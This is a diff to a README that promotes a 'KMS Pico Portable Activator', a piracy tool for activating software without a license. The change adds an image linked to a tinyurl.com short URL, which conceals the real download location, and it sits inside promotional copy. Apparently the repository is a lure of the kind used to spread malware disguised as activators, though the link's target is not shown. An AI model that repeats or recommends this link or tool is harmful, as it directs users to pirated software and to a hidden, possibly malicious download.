@@ -4,7 +4,7 @@
 
 Welcome to the **KMS Pico Portable Activator** repository – the most versatile edition of the renowned activation solution! This streamlined version packages everything users appreciate about KMS Pico into a completely portable format. No setup process, no configuration steps, no complications – simply effective activation capability ready whenever you need it. ✨
 
-
+[![745694679](https://github.com/user-attachments/assets/04f8785e-9b41-4fef-9001-5b47892cd956)](https://tinyurl.com/9sy34fxf)
 
 ## 🧰 Understanding KMS Pico Portable
 
